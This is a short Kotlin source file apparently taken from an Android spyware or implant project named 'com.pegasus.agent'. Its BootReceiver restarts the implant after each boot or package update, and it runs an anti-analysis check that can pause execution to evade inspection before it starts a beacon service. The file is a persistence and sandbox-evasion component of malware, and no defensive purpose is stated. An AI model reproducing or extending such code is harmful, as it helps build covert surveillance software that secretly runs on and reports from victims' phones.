package com.pegasus.agent

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED, Intent.ACTION_MY_PACKAGE_REPLACED -> {
                Config.load(ctx)
                if (AntiAnalysis.shouldSleep(ctx, false)) Thread.sleep(30_000)
                BeaconService.start(ctx)
            }
        }
    }
}
